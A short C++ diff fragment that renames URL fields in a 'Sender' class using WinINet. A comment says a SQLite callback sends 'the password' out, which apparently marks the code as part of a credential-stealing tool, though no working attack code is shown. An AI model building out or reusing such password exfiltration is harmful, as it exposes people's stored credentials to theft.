@@ -12,7 +12,8 @@ using namespace std;
 class Sender
 {
 private:
-	static LPCWSTR apiUrl;
+	static LPCWSTR baseUrl;
+	static LPCWSTR apiPath;
 	static HINTERNET hConnect;
 
 	//callback function of sql_exec, it will call a function to send the password
